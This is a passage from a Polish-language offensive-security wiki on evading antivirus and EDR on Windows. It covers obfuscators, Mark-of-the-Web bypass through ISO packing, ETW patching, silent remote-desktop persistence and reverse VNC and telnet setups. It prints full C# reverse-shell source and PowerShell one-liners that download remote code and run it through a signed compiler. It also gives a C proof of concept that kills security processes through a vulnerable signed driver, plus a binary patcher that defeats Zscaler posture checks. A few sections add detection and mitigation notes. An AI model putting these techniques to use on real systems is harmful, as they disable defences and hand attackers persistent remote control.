Powyższy łańcuch przywraca przepływ wykonania **bez konieczności uruchamiania złośliwego sample** – jest to przydatne podczas pracy na workstation offline.

> 🛈  ConfuserEx generuje custom attribute o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznego triage’owania sampli.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest zapewnienie open-source'owego forka pakietu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo software'u poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i ochronę przed modyfikacjami.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez korzystania z zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez framework C++ template metaprogramming, co nieco utrudnia życie osobie chcącej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuscate różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to fine-grained code obfuscation framework dla języków obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuscates program na poziomie kodu assembly, przekształcając standardowe instrukcje w ROP chains, co udaremnia nasze naturalne rozumienie normalnego control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL do shellcode, a następnie je ładować

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje uruchomią SmartScreen, wyświetlając ostrzeżenie i uniemożliwiając użytkownikowi końcowemu wykonanie pliku (plik nadal można jednak uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu, wraz z adresem URL, z którego plik został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Należy pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie uruchomią SmartScreen**.

Bardzo skutecznym sposobem zapobiegania nadaniu payloadom Mark of The Web jest spakowanie ich w pewnego rodzaju kontener, takiego jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** zostać zastosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloads do kontenerów wyjściowych w celu ominięcia Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto demo obejścia SmartScreen poprzez pakowanie payloadów w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który umożliwia aplikacjom i komponentom systemu **rejestrowanie zdarzeń**. Może być jednak również używany przez produkty bezpieczeństwa do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku wyłączenia (obejścia) AMSI, możliwe jest również sprawienie, aby funkcja **`EtwEventWrite`** procesu user space natychmiast zwracała wynik bez rejestrowania żadnych zdarzeń. Osiąga się to poprzez spatchowanie funkcji w pamięci tak, aby natychmiast zwracała wynik, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji można znaleźć w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) oraz [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binariów C# do pamięci jest znane od dłuższego czasu i nadal stanowi bardzo dobry sposób uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania go na dysku, będziemy musieli martwić się jedynie o spatchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) oferuje już możliwość bezpośredniego wykonywania assemblies C# w pamięci, ale istnieją różne sposoby realizacji tego celu:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu poświęconego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu zabiciu nowego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działań post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa**. Wadą jest **większe prawdopodobieństwo** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć konieczności tworzenia nowego procesu i skanowania go przez AV, jednak wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania payloadu, istnieje **znacznie większa szansa** na **utratę beacona**, ponieważ może on ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz przeczytać więcej o ładowaniu C# Assembly, zapoznaj się z tym artykułem [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz również ładować C# Assemblies **z PowerShell**. Sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu przy użyciu innych języków poprzez zapewnienie zaatakowanej maszynie dostępu **do środowiska interpretera zainstalowanego na kontrolowanym przez Attackera udziale SMB**.

Zapewniając dostęp do Interpreter Binaries i środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd., uzyskujemy **większą elastyczność w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## TokenStomping

Token stomping to technika umożliwiająca attackerowi **manipulowanie tokenem dostępu lub produktem bezpieczeństwa, takim jak EDR albo AV**, co pozwala ograniczyć jego uprawnienia, aby proces nie zakończył działania, ale jednocześnie nie miał uprawnień do sprawdzania złośliwych działań.

Aby temu zapobiec, Windows mógłby **uniemożliwić procesom zewnętrznym** uzyskiwanie uchwytów do tokenów procesów bezpieczeństwa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia nad nim kontroli i utrzymania persistence:
1. Pobierz aplikację ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla Windows, aby pobrać plik MSI.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij Next. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi zmianami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić PIN bez korzystania z GUI).


## Advanced Evasion

Evasion to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetry w jednym systemie, dlatego w dojrzałych środowiskach całkowite pozostanie niewykrytym jest praktycznie niemożliwe.

Każde środowisko, któremu stawiasz czoła, będzie miało własne mocne i słabe strony.

Zdecydowanie zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać podstawy dotyczące bardziej zaawansowanych technik Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To również świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) dotyczące Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwał fragmenty pliku binarnego**, aż **ustali, który fragment Defender** uznaje za złośliwy, a następnie wyodrębni go dla Ciebie.\
Innym narzędziem wykonującym **to samo zadanie jest** [**avred**](https://github.com/dobin/avred), oferującym usługę w otwartej sieci pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10 wszystkie systemy Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Uruchamiaj je przy starcie systemu i uruchom je teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet (stealth) i wyłącz firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz je z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebne są pliki bin, a nie setup)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj server:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na komputer **ofiary**

#### **Reverse connection**

**Attacker** powinien **uruchomić wewnątrz** swojego **hosta** binary `vncviewer.exe -listen 5900`, aby był **przygotowany** do przechwycenia reverse **VNC connection**. Następnie na komputerze **ofiary**: uruchom daemon winvnc `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować stealth, nie należy wykonywać kilku czynności

- Nie uruchamiaj `winvnc`, jeśli jest już uruchomiony, ponieważ wywołasz [popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy jest uruchomiony, za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, ponieważ spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` w celu uzyskania pomocy, ponieważ wywołasz [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz je z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
W GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** za pomocą `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# przy użyciu kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do budowania injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Zabijanie AV/EDR z poziomu Kernel Space

Storm-2603 wykorzystał niewielkie narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia endpointu przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* driver** i nadużywa go do wykonywania uprzywilejowanych operacji kernel, których nie mogą zablokować nawet usługi AV działające jako Protected-Process-Light (PPL).

Najważniejsze informacje
1. **Signed driver**: Plik dostarczany na dysk to `ServiceMouse.sys`, ale binary to legalnie podpisany driver `AToolsKrnl64.sys` firmy Antiy Labs, pochodzący z „System In-Depth Analysis Toolkit”. Ponieważ driver ma prawidłowy podpis Microsoft, ładuje się nawet wtedy, gdy włączone jest Driver-Signature-Enforcement (DSE).
2. **Instalacja service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwszy wiersz rejestruje driver jako **kernel service**, a drugi uruchamia go, dzięki czemu `\\.\ServiceMouse` staje się dostępny z user land.
3. **IOCTLs udostępniane przez driver**
| IOCTL code | Możliwość                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończenie dowolnego procesu według PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunięcie dowolnego pliku z dysku |
| `0x990001D0` | Wyładowanie drivera i usunięcie service |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia user-mode; kod wykonywany w kernel może otwierać *chronione* procesy, kończyć ich działanie lub manipulować obiektami kernel niezależnie od PPL/PP, ELAM i innych funkcji hardeningu.

Wykrywanie / łagodzenie skutków
•  Włącz listę blokowanych podatnych driverów Microsoftu (`HVCI`, `Smart App Control`), aby Windows odmówił załadowania `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych *kernel* services i generuj alerty, gdy driver jest ładowany z katalogu zapisywalnego przez wszystkich użytkowników lub nie znajduje się na allow-liście.
•  Obserwuj handles z user-mode do niestandardowych device objects, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie Posture Checks w Zscaler Client Connector przez patchowanie binary na dysku

**Client Connector** firmy Zscaler stosuje lokalnie reguły device-posture i korzysta z Windows RPC do przekazywania wyników innym komponentom. Dwie słabe decyzje projektowe umożliwiają pełny bypass:

1. Ewaluacja posture odbywa się **w całości po stronie klienta** (do servera wysyłana jest wartość boolean).
2. Wewnętrzne endpointy RPC sprawdzają jedynie, czy łączący się executable jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).

Przez **patchowanie czterech podpisanych binary na dysku** można zneutralizować oba mechanizmy:

| Binary | Spatchowana oryginalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest uznawana za zgodną |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces, nawet unsigned, może połączyć się z RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają kolor **green/compliant**.
* Niepodpisane lub zmodyfikowane binaria mogą otwierać endpointy named-pipe RPC (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Naruszony host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez policies Zscaler.

To case study pokazuje, jak decyzje dotyczące zaufania podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisów mogą zostać ominięte za pomocą kilku patchy bajtowych.

## Wykorzystanie Protected Process Light (PPL) do modyfikowania AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię signer/level, dzięki czemu tylko protected processes o równym lub wyższym poziomie mogą wzajemnie modyfikować swój stan. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić binary z włączonym PPL i kontrolować jego argumenty, możesz przekształcić benign functionality (np. logging) w ograniczony write primitive wspierany przez PPL, działający na protected directories używanych przez AV/EDR.

Co sprawia, że proces działa jako PPL
- Docelowy EXE (oraz wszystkie załadowane DLLs) musi być podpisany za pomocą EKU obsługującego PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z użyciem flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego protection level, odpowiadającego signerowi binary (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla anti-malware signers, `PROTECTION_LEVEL_WINDOWS` dla Windows signers). Nieprawidłowe levels spowodują niepowodzenie podczas tworzenia procesu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Open-source helper: CreateProcessAsPPL (wybiera protection level i przekazuje arguments do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Podpisany systemowy plik binarny `C:\Windows\System32\ClipUp.exe` uruchamia się samodzielnie i przyjmuje parametr umożliwiający zapisanie pliku logu w ścieżce określonej przez wywołującego.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z ochroną PPL.
- ClipUp nie potrafi analizować ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

8.3 short path helpers
- Wyświetlaj krótkie nazwy za pomocą `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z użyciem `CREATE_PROTECTED_PROCESS` i launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli docelowy plik binarny jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę auto-start, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (boot logging).
4) Po ponownym uruchomieniu zapis z ochroną PPL odbywa się przed zablokowaniem plików binarnych przez AV, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować zawartości zapisywanej przez ClipUp poza jej lokalizacją; primitive nadaje się do corruption, a nie do precyzyjnego wstrzykiwania zawartości.
- Wymaga lokalnych uprawnień administratora/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na reboot.
- Timing ma kluczowe znaczenie: target nie może być otwarty; wykonanie podczas boot pozwala uniknąć file locks.

Detections
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie gdy jego parentem są niestandardowe launchery, w pobliżu boot.
- Nowe usługi skonfigurowane do auto-startu podejrzanych plików binarnych i konsekwentnie uruchamiane przed Defender/AV. Zbadaj tworzenie/modyfikację usług poprzedzające błędy uruchamiania Defender.
- File integrity monitoring plików binarnych Defender i katalogów Platform; nieoczekiwane tworzenie/modyfikacje plików przez procesy z protected-process flags.
- Telemetria ETW/EDR: szukaj procesów tworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomu PPL przez pliki binarne inne niż AV.

Mitigations
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i z jakimi parentami; blokuj wywołania ClipUp poza uzasadnionymi kontekstami.
- Service hygiene: ograniczaj tworzenie/modyfikację usług auto-start i monitoruj manipulowanie kolejnością uruchamiania.
- Upewnij się, że tamper protection Defender i early-launch protections są włączone; badaj błędy uruchamiania wskazujące na corruption plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach przechowujących security tooling, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
